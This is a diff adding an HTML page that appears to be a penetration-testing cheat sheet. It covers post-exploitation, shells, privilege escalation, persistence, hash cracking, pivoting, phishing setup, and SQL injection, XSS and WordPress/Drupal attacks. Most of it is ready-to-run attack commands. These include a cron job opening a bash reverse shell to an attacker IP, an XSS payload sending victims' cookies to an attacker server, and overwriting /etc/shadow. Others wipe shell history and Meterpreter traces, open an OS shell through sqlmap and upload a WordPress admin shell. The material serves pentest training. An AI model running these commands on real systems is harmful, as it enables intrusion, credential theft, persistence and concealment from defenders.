+ifconfig
+ip -br -c a
+ip a
+cat /etc/networks
+cat /etc/hostname
+cat /etc/hosts
+cat /etc/resolv.conf
+arp -a
+
+## Services
+ps
+ps aux
+ps aux | grep msfconsole
+ps aux | grep root
+top
+cat /etc/cron*
+crontab -l
+
+# Metasploit
+use post/linux/gather/enum_configs
+use post/linux/gather/enum_network
+use post/linux/gather/enum_system
+use post/linux/gather/checkvm
+
+# LINENUM - Automatic Enumeration
+cd /tmp
+upload LinEnum.sh
+shell
+/bin/bash -i
+chmod +x LinEnum.sh
+./LinEnum.sh
+
+./LinEnum.sh -s -k &lt;keyword&gt; -r &lt;report&gt; -e /tmp/ -t</code></pre>
+              <h3 id="transferring-files">10.3 Transferring Files</h3>
+              <pre><code class="language-bash"># PYTHON WEB SERVER
+python -V
+python3 -V
+py -v # on Windows
+
+# Python 2.7
+python -m SimpleHTTPServer &lt;PORT_NUMBER&gt;
+
+# Python 3.7
+python3 -m http.server &lt;PORT_NUMBER&gt;
+
+# On Windows, try 
+python -m http.server &lt;PORT&gt;
+py -3 -m http.server &lt;PORT&gt;</code></pre>
+              <pre><code class="language-bash"># TMUX Terminal Multiplexer
+sudo apt install tmux -y</code></pre>
+              <h3 id="shells-1">10.4 Shells</h3>
+              <pre><code class="language-bash">cat /etc/shells
+    # /etc/shells: valid login shells
+    /bin/sh
+    /bin/dash
+    /bin/bash
+    /bin/rbash
+
+/bin/bash -i
+
+/bin/sh -i</code></pre>
+              <h4 id="tty-shells">10.4.1 TTY Shells</h4>
+              <pre><code class="language-bash"># BASH
+/bin/bash -i
+/bin/sh -i
+SHELL=/bin/bash script -q /dev/null
+
+# Setup environment variables
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export TERM=xterm
+export SHELL=/bin/bash</code></pre>
+              <pre><code class="language-bash"># PYTHON
+python --version
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+## Fully Interactive TTY
+# Background (CTRL+Z) the current remote shell
+stty raw -echo &amp;&amp; fg
+# Reinitialize the terminal with reset
+reset</code></pre>
+              <pre><code class="language-bash"># FULL TTY PYTHON3 SHELL
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Background CTRL+Z
+stty raw -echo &amp;&amp; fg
+# ENTER
+export SHELL=/bin/bash
+export TERM=screen
+stty rows 36 columns 157
+# stty -a to get the rows &amp; columns of the attacker terminal
+reset</code></pre>
+              <pre><code class="language-bash"># PERL
+perl -h
+perl -e 'exec "/bin/bash";'</code></pre>
+              <h3 id="win-privilege-escalation">10.5 Win Privilege Escalation</h3>
+              <pre><code class="language-bash"># PrivescCHECK - PowerShell script
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML"
+
+## Basic mode
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+
+## Extended Mode + Export Txt Report
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"</code></pre>
+              <h3 id="linux-privilege-escalation-1">10.6 Linux Privilege Escalation</h3>
+              <pre><code class="language-bash"># Writable files
+find / -not -type l -perm -o+w
+
+# e.g. of /etc/shadow with write permissions
+openssl passwd -1 -salt abc password123
+vim /etc/shadow # Paste the hashed password
+su
+
+# SETUID - SUDO privileges
+find / -user root -perm -4000 -exec ls -ldb {} \;
+find / -perm -u=s -type f 2&gt;/dev/null
+
+sudo -l
+
+# e.g. User can run 'man' with SUDO Privileges
+sudo man ls
+	!/bin/bash</code></pre>
+              <h3 id="win-persistence">10.7 Win Persistence</h3>
+              <pre><code class="language-bash"># msfcosole - Admin Meterpreter
+search platform:windows persistence
+use exploit/windows/local/persistence_service
+set payload windows/meterpreter/reverse_tcp
+set LPORT &lt;PORT&gt;
+set SESSION 1
+run
+
+# Meterpreter - Enable RDP
+run getgui -e -u &lt;NEWUSER&gt; -p &lt;PW&gt;</code></pre>
+              <h3 id="linux-persistence">10.8 Linux Persistence</h3>
+              <pre><code class="language-bash">ls -lah ~/.ssh/
+cat ~/.ssh/id_rsa
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/known_hosts
+
+# Download the 'id_rsa' file
+scp &lt;USER&gt;@&lt;TARGET_IP&gt;:~/.ssh/id_rsa .
+chmod 400 id_rsa
+
+ssh -i id_rsa &lt;USER&gt;@&lt;TARGET_IP&gt;
+
+# Cron Jobs
+cat /etc/cron*
+echo "* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/&lt;PORT&gt; 0&gt;&amp;1'" &gt; cron
+crontab -i cron
+crontab -l
+
+# Setup a 'nc' listener and wait for the Bash Reverse Shell
+nc -nvlp &lt;PORT&gt;</code></pre>
+              <h3 id="dumping-cracking">10.9 Dumping &amp; Cracking</h3>
+              <h4 id="windows">10.9.1 Windows</h4>
+              <pre><code class="language-bash">hashdump
+
+# JohnTheRipper
+john --list=formats | grep NT
+john --format=NT hashes.txt
+
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+john &lt;Hash_Password-File&gt; --wordlist=/usr/share/wordlists/rockyou.txt # To crack the password from your previous output (hashdump,shadow file )
+john --format=NT win_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+john -wordlist /usr/share/wordlists/rockyou.txt crack.hash
+john -wordlist /usr/share/wordlists/rockyou.txt -users users.txt test.hash
+
+#this is another way to crack passwords (that requires shadow file with passwd file)
+unshadow passwd shadow &gt; unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -a 3 -m 1000 --show hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt</code></pre>
+              <h4 id="linux">10.9.2 Linux</h4>
+              <pre><code class="language-bash">cat /etc/shadow
+
+# Metasploit
+use post/linux/gather/hashdump
+
+john --format=sha512crypt linux.hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john -wordlist /usr/share/wordlists/rockyou.txt crack.hash
+john -wordlist /usr/share/wordlists/rockyou.txt -users users.txt test.hash
+
+# Hashcat
+hashcat --help | grep 1800
+hashcat -a 3 -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt
+ashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt</code></pre>
+              <h3 id="pivoting-1">10.10 Pivoting</h3>
+              <pre><code class="language-bash"># Checking Routes
+ip route    # Checking defined routes in linux
+route       # Checking defined routes in linux
+route print     # Checking defined routes in windows
+
+# Adding Manual Routes
+ip route add &lt;subnet&gt; via &lt;gateway or router address&gt;
+# for example:
+ip route add 192.168.222.0/24 via 10.172.24.1   # Here 10.172.24.1 is the address of the gateway for subnet 192.168.222.0/24
+
+# Meterpreter on Target1
+run autoroute -s &lt;TARGET1_SUBNET_NETWORK&gt;
+run autoroute -p    # show active route table
+run arp_scanner -r &lt;TARGET1_SUBNET_NETWORK&gt;
+
+background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS &lt;TARGET2_IP&gt;
+set PORTS 1-100
+run
+
+# MeterpreterPort Forwarding
+portfwd add -l &lt;LOCAL_PORT&gt; -p &lt;TARGET_PORT&gt; -r &lt;TARGET_IP&gt;
+
+db_nmap -sS -sV -p &lt;LOCAL_PORT&gt; localhost
+</code></pre>
+              <h3 id="clearing-tracks">10.11 Clearing Tracks</h3>
+              <pre><code class="language-bash"># Windows C:\Temp - Metasploit e.g.
+cd C:\\
+mkdir Temp
+cd Temp # Clean this C:\Temp directory
+
+## Cleanup Meterpreter RC File:
+cat /root/.msf4/logs/persistence/&lt;CLEANING_SCRIPT&gt;.rc
+background
+sessions 1
+resource /root/.msf4/logs/persistence/&lt;CLEANING_SCRIPT&gt;.rc
+run multi_console_command -r /root/.msf4/logs/scripts/getgui/&lt;CLEANING_SCRIPT&gt;.rc
+
+clearenv
+
+# Linux /tmp
+cd /tmp
+history -c
+cat /dev/null &gt; ~/.bash_history</code></pre>
+              <h2 id="social-engineering">11. Social Engineering</h2>
+              <pre><code class="language-bash"># GOPHISH - Linux Install
+cd /opt/
+# Get the latest version link from https://github.com/gophish/gophish/releases/
+sudo wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
+sudo unzip -d gophish gophish-v0.12.1-linux-64bit.zip
+sudo chmod +x gophish/gophish
+
+cd /opt/gophish &amp;&amp; sudo ./gophish
+
+## Run in Docker instead
+docker run -ti -p 3333:3333 --rm gophish/demo</code></pre>
+              <h2 id="web-application-penetration-testing">12. Web Application Penetration Testing</h2>
+              <h3 id="tools">12.1 Tools</h3>
+              <pre><code class="language-bash"># Gobuster - Install
+sudo apt update &amp;&amp; sudo apt install -y gobuster
+
+# Dirbuster - Install
+sudo apt update &amp;&amp; sudo apt install -y dirb
+
+# Nikto - Install
+sudo apt update &amp;&amp; sudo apt install -y nikto
+
+# BurpSuite - Install
+sudo apt update &amp;&amp; sudo apt install -y burpsuite
+
+# SQLMap - Install
+sudo apt update &amp;&amp; sudo apt install -y sqlmap
+
+# XSSer - Install
+sudo apt update &amp;&amp; sudo apt install -y xsser
+
+# WPScan - Install
+sudo apt update &amp;&amp; sudo apt install -y wpscan
+
+# Hydra - Install
+sudo apt update &amp;&amp; sudo apt install -y hydra</code></pre>
+              <h3 id="enumeration-scanning">12.2 Enumeration &amp; Scanning</h3>
+              <pre><code class="language-bash">nmap -sS -sV -p 80,443,3306 &lt;TARGET_IP&gt;
+
+# Dirbuster
+dirb http://&lt;TARGET_IP&gt;
+
+# CURL
+curl -I &lt;TARGET_IP&gt;
+curl -X GET &lt;TARGET_IP&gt;
+curl -X OPTIONS &lt;TARGET_IP&gt; -v
+curl -X POST &lt;TARGET_IP&gt;
+curl -X POST &lt;TARGET_IP&gt;/login.php -d "name=john&amp;password=password" -v
+curl -X PUT &lt;TARGET_IP&gt;
+
+curl &lt;TARGET_IP&gt;/uploads/ --upload-file hello.txt
+curl -X DELETE &lt;TARGET_IP&gt;/uploads/hello.txt -v
+
+# Gobuster
+gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirb/common.txt -b 403,404
+
+gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
+
+gobuster dir -u http://&lt;TARGET_IP&gt;/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
+
+# Ffuf
+## Directory discovery:
+ffuf -w wordlist.txt -u http://example.com/FUZZ
+## File discovery:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -e .aspx,.php,.txt,.html
+## Output of responses with status code:
+ffuf -w /usr/share/wordlists/dirb/small.txt -u http://example.com/FUZZ -mc 200,301
+## The -maxtime flag offers to end the ongoing fuzzing after the specified time in seconds:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -maxtime 60
+## Number of threads:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -t 64
+
+# Nikto
+nikto -h http://&lt;TARGET_IP&gt; -o niktoscan.txt
+
+nikto -h http://&lt;TARGET_IP&gt;/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm
+
+#WPScan
+wpscan --url http://&lt;TARGET_IP&gt;--enumerate u
+wpscan --url http://&lt;TARGET_IP&gt; -e vp --plugins-detection mixed --api-token API_TOKEN
+wpscan --url http://&lt;TARGET_IP&gt; -e u --passwords /usr/share/wordlists/rockyou.txt
+wpscan --url http://&lt;TARGET_IP&gt; -U admin -P /usr/share/wordlists/rockyou.txt</code></pre>
+              <h3 id="attacks">12.3 Attacks</h3>
+              <h3 id="sqlmap">12.4 SQLMap</h3>
+              <h4 id="check-if-injection-exists">12.4.1 Check if injection exists</h4>
+              <pre><code class="language-bash">sqlmap -r &lt;REQUEST_FILE&gt; -p &lt;POST_PARAMETER&gt;
+sqlmap -r Post.req
+
+sqlmap -u "http://&lt;TARGET_IP&gt;/sqli_1.php?title=hacking&amp;action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title
+
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id          #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&amp;password=admin"      #POST Method</code></pre>
+              <h4 id="get-database-if-injection-exists">12.4.2 Get database if injection Exists</h4>
+              <pre><code class="language-bash">sqlmap -r login.req --dbs
+sqlmap -u "http://10.10.10.10/file.php?id=1" --dbs    #determine the databases:
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs    #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&amp;password=admin" --dbs #POST Method
+
+# List databases
+sqlmap -u "http://&lt;TARGET_IP&gt;/sqli_1.php?title=hacking&amp;action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title --dbs
+sqlmap -u "http://&lt;TARGET_IP&gt;/sqli_1.php?title=hacking&amp;action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP --tables
+sqlmap -u "http://&lt;TARGET_IP&gt;/sqli_1.php?title=hacking&amp;action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users --columns
+sqlmap -u "http://&lt;TARGET_IP&gt;/sqli_1.php?title=hacking&amp;action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump</code></pre>
+              <p><strong>Get Tables in a Database</strong></p>
+              <pre><code class="language-bash">sqlmap -r login.req -D dbname --tables    #determine the tables:
+sqlmap -u "http://10.10.10.10/file.php?id=1" -D dbname --common-tables    #if tables not available, guess tables using common names
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables        #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&amp;password=admin" -D dbname --tables #POST Method</code></pre>
+              <p><strong>Get data in a Database tables</strong></p>
+              <pre><code class="language-bash">sqlmap -r login.req -D dbname -T table_name --dump
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump      #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&amp;password=admin" -D dbname -T table_name --dump   #POST Method</code></pre>
+              <h4 id="get-os-shell">12.4.3 Get OS-Shell</h4>
+              <pre><code class="language-bash">sqlmap -u "http://10.10.10.10/file.php?id=1" --os-shell</code></pre>
+              <h3 id="xss">12.5 XSS</h3>
+              <p>Check an example:</p>
+              <pre><code class="language-javascript">&lt;script&gt;alert("hack :)")&lt;/script&gt;</code></pre>
+              <p><strong>Hijack cookie through xss</strong></p>
+              <p>there are four components as follows:</p>
+              <ul><li>attacker client pc</li><li>attacker logging server</li><li>vulnerable server</li><li>victim client pc</li><li>attacker: first finds a vulnerable server and its breach point.</li><li>attacker: enter the following snippet in order to hijack the cookie kepts by victim client pc (p.s.: the ip address, 192.168.99.102, belongs to attacker logging server in this example):</li></ul>
+              <pre><code class="language-javascript">&lt;script&gt;var i = new Image();i.src="http://192.168.99.102/log.php?q="+document.cookie;&lt;/script&gt;</code></pre>
+              <ul><li>attacker: log into attacker logging server (P.S.: it is 192.168.99.102 in this example), and execute the following command:</li></ul>
+              <pre><code class="language-bash">nc -vv -k -l -p 80</code></pre>
+              <ul><li>attacker: when victim client pc browses the vulnerable server, check the output of the command above.</li><li>attacker: after obtaining the victim’s cookie, utilize a firefox’s add-on called Cookie Quick Manager to change to the victim’s cookie in an effort to hijack the victim’s privilege.</li></ul>
+              <p><strong>XSSer</strong></p>
+              <pre><code class="language-bash">xsser --url 'http://&lt;TARGET_IP&gt;/index.php?page=dns-lookup.php' -p
+'target_host=XSS&amp;dns-lookup-php-submit-button=Lookup+DNS'
+
+xsser --url 'http://&lt;TARGET_IP&gt;/index.php?page=dns-lookup.php' -p
+'target_host=XSS&amp;dns-lookup-php-submit-button=Lookup+DNS' --auto
+
+xsser --url 'http://&lt;TARGET_IP&gt;/index.php?page=dns-lookup.php' -p 'target_host=XSS&amp;dns-lookup-php-submit-button=Lookup+DNS' --Fp "&lt;script&gt;alert(1)&lt;/script&gt;"
+
+xsser --url "http://&lt;TARGET_IP&gt;/index.php?page=user-poll.php&amp;csrf-token=&amp;choice=XSS&amp;initials=2&amp;user-poll-php-submit-button=Submit+Vote" --Fp "&lt;script&gt;alert(1)&lt;/script&gt;"
+
+## Authenticated XSSer
+xsser --url "http://&lt;TARGET_IP&gt;/htmli_get.php?firstname=XSS&amp;lastname=hi&amp;form=submit" --cookie="PHPSESSID=lb3rg4q495t9sqph907sdhjgg1; security_level=0" --Fp "&lt;script&gt;alert(1)&lt;/script&gt;"</code></pre>
+              <h4 id="hydra-4">12.5.1 Hydra</h4>
+              <pre><code class="language-bash"># Basic auth attacks (brute-force)
+hydra -L &lt;USERS_LIST&gt; -P &lt;PW_LIST&gt; &lt;TARGET_IP&gt; http-post-form "/login.php:login=^USER^&amp;password=^PASS^&amp;security_level=0&amp;form=submit:Invalid credentials or user not activated!"</code></pre>
+              <h2 id="wordpress">13. Wordpress</h2>
+              <h3 id="basic-information">13.1 Basic Information</h3>
+              <p><strong>Uploaded</strong> files go to: <code>http://10.10.10.10/wp-content/uploads/2018/08/a.txt</code>\ <strong>Themes files can be found in /wp-content/themes/,</strong> so if you change some php of the theme to get RCE you probably will use that path. For example: Using <strong>theme twentytwelve</strong> you can <strong>access</strong> the <strong>404.php</strong> file in: <a href="http://10.11.1.234/wp-content/themes/twentytwelve/404.php" target="_blank" rel="noopener noreferrer"><strong>/wp-content/themes/twentytwelve/404.php</strong></a>\ <strong>Another useful url could be:</strong> <a href="http://10.11.1.234/wp-content/themes/twentytwelve/404.php" target="_blank" rel="noopener noreferrer"><strong>/wp-content/themes/default/404.php</strong></a></p>
+              <p>In <strong>wp-config.php</strong> you can find the root password of the database.</p>
+              <p>Default login paths to check: _<strong>/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/</strong>_</p>
+              <h4 id="main-wordpress-files">13.1.1 Main WordPress Files</h4>
+              <ul><li><code>index.php</code></li><li><code>license.txt</code> contains useful information such as the version WordPress installed.</li><li><code>wp-activate.php</code> is used for the email activation process when setting up a new WordPress site.</li><li>Login folders (may be renamed to hide it):<ul><li><code>/wp-admin/login.php</code></li><li><code>/wp-admin/wp-login.php</code></li><li><code>/login.php</code></li><li><code>/wp-login.php</code></li></ul></li><li><code>xmlrpc.php</code> is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress <a href="https://developer.wordpress.org/rest-api/reference" target="_blank" rel="noopener noreferrer">REST API</a>.</li><li>The <code>wp-content</code> folder is the main directory where plugins and themes are stored.</li><li><code>wp-content/uploads/</code> Is the directory where any files uploaded to the platform are stored.</li><li><code>wp-includes/</code> This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.</li></ul>
+              <p><strong>Post exploitation</strong></p>
+              <ul><li>The <code>wp-config.php</code> file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.</li></ul>
+              <h4 id="users-permissions">13.1.2 Users Permissions</h4>
+              <ul><li><strong>Administrator</strong></li><li><strong>Editor</strong>: Publish and manages his and others posts</li><li><strong>Author</strong>: Publish and manage his own posts</li><li><strong>Contributor</strong>: Write and manage his posts but cannot publish them</li><li><strong>Subscriber</strong>: Browser posts and edit their profile</li></ul>
+              <h3 id="passive-enumeration">13.2 Passive Enumeration</h3>
+              <h4 id="get-wordpress-version">13.2.1 Get WordPress version</h4>
+              <p>Check if you can find the files <code>/license.txt</code> or <code>/readme.html</code></p>
+              <p>Inside the <strong>source code</strong> of the page (example from <a href="https://wordpress.org/support/article/pages/" target="_blank" rel="noopener noreferrer">https://wordpress.org/support/article/pages/</a>):</p>
+              <ul><li>Grep</li></ul>
+              <pre><code class="language-bash">curl https://victim.com/ | grep 'content="WordPress'</code></pre>
+              <ul><li>Meta name</li></ul>
+              <p>&lt;div align="left"&gt;</p>
+              <p>&lt;figure&gt;&lt;img src=".gitbook/assets/image (3).png" alt=""&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;/figure&gt;</p>
+              <p>&lt;/div&gt;</p>
+              <ul><li>CSS link files</li></ul>
+              <p>&lt;figure&gt;&lt;img src=".gitbook/assets/image (4).png" alt=""&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;/figure&gt;</p>
+              <ul><li>JavaScript files</li></ul>
+              <p>&lt;figure&gt;&lt;img src=".gitbook/assets/image (5).png" alt=""&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;/figure&gt;</p>
+              <h4 id="get-plugins">13.2.2 Get Plugins</h4>
+              <pre><code class="language-bash">curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2</code></pre>
+              <h4 id="get-themes">13.2.3 Get Themes</h4>
+              <pre><code class="language-bash">curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2</code></pre>
+              <h4 id="extract-versions-in-general">13.2.4 Extract versions in general</h4>
+              <pre><code class="language-bash">curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2</code></pre>
+              <h3 id="active-enumeration">13.3 Active enumeration</h3>
+              <h4 id="plugins-and-themes">13.3.1 Plugins and Themes</h4>
+              <p>You probably won't be able to find all the Plugins and Themes passible. In order to discover all of them, you will need to <strong>actively Brute Force a list of Plugins and Themes</strong> (hopefully for us there are automated tools that contains this lists).</p>
+              <h4 id="users">13.3.2 Users</h4>
+              <h4 id="id-brute">13.3.3 ID Brute</h4>
+              <p>You get valid users from a WordPress site by Brute Forcing users IDs:</p>
+              <pre><code class="language-bash">curl -s -I -X GET http://blog.example.com/?author=1</code></pre>
+              <p>If the responses are <strong>200</strong> or <strong>30X</strong>, that means that the id is <strong>valid</strong>. If the the response is <strong>400</strong>, then the id is <strong>invalid</strong>.</p>
+              <p><strong>wp-json</strong></p>
+              <p>You can also try to get information about the users by querying:</p>
+              <pre><code class="language-bash">curl http://blog.example.com/wp-json/wp/v2/users</code></pre>
+              <p><strong>Only information about the users that has this feature enable will be provided</strong>.</p>
+              <p>Also note that <strong>/wp-json/wp/v2/pages</strong> could leak IP addresses.</p>
+              <h4 id="login-username-enumeration">13.3.4 Login username enumeration</h4>
+              <p>When login in <strong><code>/wp-login.php</code></strong> the <strong>message</strong> is <strong>different</strong> is the indicated <strong>username exists or not</strong>.</p>
+              <h4 id="wpscan">13.3.5 WPScan</h4>
+              <pre><code class="language-bash">wpscan -h #List WPscan Parameters
+wpscan --update #Update WPscan
+
+#Enumerate WordPress using WPscan
+
+
+wpscan --url "http://&lt;TARGET_IP&gt;" -e t #All Themes Installed
+
+wpscan --url "http://&lt;TARGET_IP&gt;" -e vt #Vulnerable Themes Installed
+
+wpscan --url "http://&lt;TARGET_IP&gt;"  -e p #All Plugins Installed
+
+wpscan --url "http://&lt;TARGET_IP&gt;"  -e vp #Vulnerable Themes Installed
+
+wpscan --url "http://&lt;TARGET_IP&gt;"  -e u #WordPress Users
+
+wpscan --url "http://&lt;TARGET_IP&gt;"  --passwords path-to-wordlist #Brute Force WordPress Passwords
+
+#Upload Reverse Shell to WordPress
+http://&lt;IP&gt;/wordpress/wp-content/themes/twentyfifteen/404.php
+
+#Upload using Metasploit
+msf &gt; use exploit/unix/webapp/wp_admin_shell_upload
+msf exploit(wp_admin_shell_upload) &gt; set USERNAME admin
+msf exploit(wp_admin_shell_upload) &gt; set PASSWORD admin
+msf exploit(wp_admin_shell_upload) &gt; set targeturi /wordpress
+msf exploit(wp_admin_shell_upload) &gt; exploit</code></pre>
+              <h2 id="drupal">14. Drupal</h2>
+              <h2 id="discovery">15. Discovery</h2>
+              <ul><li>Check <strong>meta</strong></li></ul>
+              <pre><code class="language-bash">curl https://www.drupal.org/ | grep 'content="Drupal'</code></pre>
+              <ul><li><strong>Node</strong>: Drupal <strong>indexes its content using nodes</strong>. A node can <strong>hold anything</strong> such as a blog post, poll, article, etc. The page URIs are usually of the form <code>/node/&lt;nodeid&gt;</code>.</li></ul>
+              <pre><code class="language-bash">curl drupal-site.com/node/1</code></pre>
+              <h2 id="drupal-enumeration">16. Drupal Enumeration</h2>
+              <p>Drupal supports <strong>three types of users</strong> by default:</p>
+              <ul><li><strong><code>Administrator</code></strong>: This user has complete control over the Drupal website.</li><li><strong><code>Authenticated User</code></strong>: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.</li><li><strong><code>Anonymous</code></strong>: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.</li></ul>
+              <h3 id="version">16.1 Version</h3>
+              <ul><li>Check <code>/CHANGELOG.txt</code></li></ul>
+              <pre><code class="language-bash">curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""
+
+Drupal 7.57, 2018-02-21</code></pre>
+              <p>{% hint style="info" %} Newer installs of Drupal by default block access to the <code>CHANGELOG.txt</code> and <code>README.txt</code> files. {% endhint %}</p>
+              <h3 id="username-enumeration">16.2 Username enumeration</h3>
+              <h4 id="register">16.2.1 Register</h4>
+              <p>In _/user/register_ just try to create a username and if the name is already taken it will be notified:</p>
+              <p>&lt;figure&gt;&lt;img src=".gitbook/assets/image (13).png" alt=""&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;/figure&gt;</p>
+              <h4 id="request-new-password">16.2.2 Request new password</h4>
+              <p>If you request a new password for an existing username:</p>
+              <p>&lt;figure&gt;&lt;img src=".gitbook/assets/image (14).png" alt=""&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;/figure&gt;</p>
+              <p>If you request a new password for a non-existent username:</p>
+              <p>&lt;figure&gt;&lt;img src=".gitbook/assets/image (10).png" alt=""&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;/figure&gt;</p>
+              <h3 id="get-number-of-users">16.3 Get number of users</h3>
+              <p>Accessing _/user/\&lt;number&gt;_ you can see the number of existing users, in this case is 2 as _/users/3_ returns a not found error:</p>
+              <p>&lt;figure&gt;&lt;img src=".gitbook/assets/image (12).png" alt=""&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;/figure&gt;</p>
+              <p>&lt;figure&gt;&lt;img src=".gitbook/assets/image (11).png" alt=""&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;/figure&gt;</p>
+              <h3 id="hidden-pages">16.4 Hidden pages</h3>
+              <p><strong>Fuzz <code>/node/$</code> where <code>$</code> is a number</strong> (from 1 to 500 for example).\ You could find <strong>hidden pages</strong> (test, dev) which are not referenced by the search engines.</p>
+              <h4 id="installed-modules-info">16.4.1 Installed modules info</h4>
+              <pre><code class="language-bash">#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
+#Get info on installed modules
+curl https://example.com/config/sync/core.extension.yml
+curl https://example.com/core/core.services.yml
+
+# Download content from files exposed in the previous step
+curl https://example.com/config/sync/swiftmailer.transport.yml</code></pre>
+              <h3 id="automatic">16.5 Automatic</h3>
+              <pre><code class="language-bash">droopescan scan drupal -u http://drupal-site.local</code></pre>
+              <h4 id="rce">16.5.1 RCE</h4>
+              <h4 id="with-php-filter-module">16.5.2 With PHP Filter Module</h4>
+              <p>{% hint style="warning" %} In older versions of Drupal <strong>(before version 8)</strong>, it was possible to log in as an admin and <strong>enable the <code>PHP filter</code> module</strong>, which "Allows embedded PHP code/snippets to be evaluated." {% endhint %}</p>
+              <p>You need the <strong>plugin php to be installed</strong> (check it accessing to _/modules/php_ and if it returns a <strong>403</strong> then, <strong>exists</strong>, if <strong>not found</strong>, then the <strong>plugin php isn't installed</strong>)</p>
+              <p>Go to _Modules_ -&gt; (<strong>Check</strong>) _PHP Filter_ -&gt; _Save configuration_</p>
+              <p>&lt;figure&gt;&lt;img src=".gitbook/assets/image (6).png" alt=""&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;/figure&gt;</p>
+              <p>Then click on _Add content_ -&gt; Select _Basic Page_ or _Article -_&gt; Write _php shellcode on the body_ -&gt; Select _PHP code_ in _Text format_ -&gt; Select _Preview_</p>
+              <p>&lt;figure&gt;&lt;img src=".gitbook/assets/image (7).png" alt=""&gt;&lt;figcaption&gt;&lt;/figcaption&gt;&lt;/figure&gt;</p>
+              <p>Finally just access the newly created node:</p>
+              <pre><code class="language-bash">curl http://drupal-site.local/node/3</code></pre>
+              <h4 id="install-php-filter-module">16.5.3 Install PHP Filter Module</h4>
+              <p>From version <strong>8 onwards, the</strong> <a href="https://www.drupal.org/project/php/releases/8.x-1.1" target="_blank" rel="noopener noreferrer"><strong>PHP Filter</strong></a> <strong>module is not installed by default</strong>. To leverage this functionality, we would have to <strong>install the module ourselves</strong>.</p>
